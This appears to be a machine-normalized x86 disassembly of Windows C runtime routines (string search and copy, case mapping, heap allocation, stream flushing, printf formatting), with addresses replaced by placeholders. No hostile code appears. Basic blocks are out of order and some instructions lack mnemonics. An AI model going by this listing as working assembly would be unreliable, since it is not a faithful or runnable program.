imul ecx ecx 0xf
shl eax 0x4
sub eax ecx
jmp r-xdata
lea eax [ edi + 0x8 ]
jmp r-xdata
xor eax eax
lea eax [ esi + edx ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
movzx esi bl
add eax esi
push 0x1
lea ebx [ eax + 0x1 ]
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov al [ esi ]
test al al
jne r-xdata
cmp esi edx
jae r-xdata
inc ebx
inc esi
jmp r-xdata
movzx eax al
add esi eax
jmp r-xdata
push 0x1
lea ebx [ esi + 0x1 ]
pop eax
lea ebx [ eax + edx ]
cmp ebx [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x4 ]
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
cmp esi edi
jae r-xdata
cmp eax edx
jae r-xdata
inc ebx
inc eax
jmp r-xdata
and [ ecx + 0x4 ] 0x0
lea esi [ ecx + 0x8 ]
mov [ ecx ] esi
sub esi edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] esi
jmp r-xdata
sub [ ebp + 0xc ] esi
cmp [ ebp + 0xc ] edx
jb r-xdata
mov [ ecx + 0x4 ] esi
jmp r-xdata
lea ebx [ esi + edx ]
cmp ebx [ ebp + 0x8 ]
jae r-xdata
sub [ ebp + 0xc ] eax
cmp [ ebp + 0xc ] edx
jb r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov [ eax ] dl
add eax 0x8
jmp r-xdata
mov edi [ ebp - 0x4 ]
mov eax ebx
jmp r-xdata
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
sub eax edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov esi ebx
jmp r-xdata
lea esi [ eax + edx ]
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov [ esi ] dl
lea eax [ esi + 0x8 ]
sub_415670
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
movzx ecx [ edx ]
push edi
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax [ edi + 0x10 ]
sar eax 0xc
cmp ecx [ ebp + 0x14 ]
lea edi [ edi + eax * 8 + 0x18 ]
jbe r-xdata
jae r-xdata
mov eax [ ebp + 0x14 ]
sub ecx eax
mov [ edx ] al
add [ edi ] ecx
mov [ edi + 0x4 ] 0xf1
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
lea esi [ edx + eax ]
lea eax [ ebx + 0xf8 ]
cmp eax esi
jb r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ ecx + edx ]
jne r-xdata
cmp [ eax ] 0x0
jne r-xdata
mov al [ ebp + 0x14 ]
mov [ edx ] al
mov eax [ ebx ]
cmp edx eax
ja r-xdata
cmp eax esi
inc eax
jmp r-xdata
sub ecx [ ebp + 0x14 ]
add [ edi ] ecx
cmp esi eax
jbe r-xdata
cmp eax esi
jae r-xdata
lea eax [ ebx + 0xf8 ]
cmp esi eax
jae r-xdata
and [ ebx + 0x4 ] 0x0
lea eax [ ebx + 0x8 ]
mov [ ebx ] eax
xor eax eax
mov [ ebx ] esi
cmp [ esi ] al
jne r-xdata
mov [ ebx + 0x4 ] eax
jmp r-xdata
inc eax
cmp [ esi + eax ] 0x0
je r-xdata
sub_415719
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
cmp [ rw-data ] ebx
mov edi [ InterlockedDecrement@IAT ]
je r-xdata
mov eax [ esp + 0x8 ]
cmp eax 0x61
jl r-xdata
push [ esp + 0x10 ]
call sub_415788
test ebx ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
push esi
call edi
push 0x13
call sub_4136da
pop ecx
push 0x1
pop ebx
pop ebx
retn
cmp eax 0x7a
jg r-xdata
push esi
call edi
push 0x13
call sub_41373b
pop ecx
jmp r-xdata
sub eax 0x20
pop ebx
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
sub_415788
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x61
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
pop ebx
leave
retn
cmp eax 0x7a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
push 0x1
and [ ebp + 0xa ] 0x0
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
push 0x2
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x2
push 0x2
push ebx
call sub_4138b4
pop ecx
pop ecx
jmp r-xdata
sub eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
pop eax
lea ecx [ ebp - 0x4 ]
push 0x1
push 0x0
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push [ rw-data ]
call sub_41596a
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_415870
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_415930
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
inc edx
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_41596a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_415b8e
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push r--data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_411530
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_411530
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_415b8e
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_415bc0
push ebp
mov ebp esp
push edi
push esi
mov edi [ ebp + 0x8 ]
mov edx edi
mov esi edi
xor eax eax
or ecx 0xffffffff
[ edi ]
cmp ecx 0xfffffffe
je r-xdata
mov eax edx
pop esi
pop edi
leave
retn
dec edi
dec edi
mov ah [ esi ]
mov al [ edi ]
mov [ esi ] al
mov [ edi ] ah
inc esi
dec edi
jmp r-xdata
cmp esi edi
jae r-xdata
sub_415bf0
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_415c00
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_415ce0
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
imul esi [ ebp + 0xc ]
mov [ ebp + 0xc ] esi
mov [ ebp - 0x1c ] esi
cmp esi 0xffffffe0
ja r-xdata
xor ebx ebx
xor ebx ebx
cmp esi ebx
jne r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
jmp r-xdata
push 0x1
pop esi
mov eax [ ebp - 0x20 ]
cmp [ rw-data ] ebx
je r-xdata
cmp eax 0x2
jne r-xdata
mov edi [ ebp - 0x1c ]
cmp edi [ rw-data ]
ja r-xdata
mov [ ebp - 0x20 ] ebx
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_4144ea
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
push 0x9
call sub_4136da
pop ecx
mov [ ebp - 0x4 ] ebx
push edi
call sub_4148a1
pop ecx
mov [ ebp - 0x20 ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_415d79
cmp [ ebp - 0x20 ] ebx
je r-xdata
jmp r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x20 ] eax
push 0x9
call sub_4136da
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax esi
shr eax 0x4
push eax
call sub_415344
pop ecx
mov [ ebp - 0x20 ] eax
or [ ebp - 0x4 ] 0xffffffff
call sub_415e02
cmp [ ebp - 0x20 ] ebx
je r-xdata
push [ ebp - 0x1c ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
push ebx
push [ ebp - 0x20 ]
call sub_410a20
add esp 0xc
sub_415e20
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
inc esi
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_415ea0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
nop
inc edx
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jb r-xdata
mov al [ edx ]
or al al
je r-xdata
inc ecx
mov al [ esi ]
or al al
je r-xdata
sub_415ee0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
nop
inc edx
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
inc ecx
mov al [ esi ]
or al al
je r-xdata
sub_415f20
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
inc ecx
neg ecx
dec edi
mov al [ ebp + 0xc ]
std
[ edi ]
inc edi
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_415f47
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_417926
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_417b5a
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_417926
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_417b16
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov ecx ebx
mov eax ebx
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_41784e
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_41605f
push ebp
mov ebp esp
sub esp 0x248
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp + 0xc ] edi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
xor edx edx
jmp r-xdata
cmp [ ebp - 0x14 ] edx
jl r-xdata
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov edi [ ebp + 0xc ]
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp + 0xc ] edi
jne r-xdata
jmp [ eax * 4 + jump_table_416780 ]
movsx eax bl
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x30 ]
xor edx edx
or [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x24 ] edx
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] edx
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ esi + eax * 8 + r--data ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x30 ] eax
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x20 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_41683e
test eax eax
pop ecx
mov [ ebp - 0x20 ] eax
jge r-xdata
lea eax [ ecx + ecx * 4 ]
movsx ecx bl
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_41683e
test eax eax
pop ecx
mov [ ebp - 0x10 ] eax
jge r-xdata
cmp [ edi ] 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_4167a0
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_4167a0
mov bl [ edi ]
add esp 0xc
inc edi
mov [ ebp + 0xc ] edi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x30 ] edx
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
lea edi [ ebp - 0x248 ]
cmp ecx edx
mov [ ebp - 0x8 ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
inc edi
inc edi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_41684b
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_41683e
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x10 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0x3 ] 0x8
jmp r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x8
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x34 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x10 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x48 ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x44 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
cmp bl 0x67
jne r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_41683e
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x2c ] 0x7
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_41683e
pop ecx
xor edx edx
call sub_41683e
pop ecx
jmp r-xdata
call sub_41683e
pop ecx
movzx eax ax
jmp r-xdata
call sub_41683e
pop ecx
movsx eax ax
mov esi eax
mov edi edx
test edx edx
jg r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x3 ] 0x2
jmp r-xdata
mov [ ebp - 0x10 ] 0x8
sub eax 0x3
je r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
dec eax
je r-xdata
mov al [ ebp - 0x2c ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x1c ] 0x2
mov [ ebp - 0x15 ] al
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
and edi 0x0
jl r-xdata
mov esi [ ebp - 0x10 ]
cmp esi 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x248 ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
call sub_411a10
pop ecx
jmp r-xdata
test [ ebp - 0x3 ] 0x8
je r-xdata
call sub_41683e
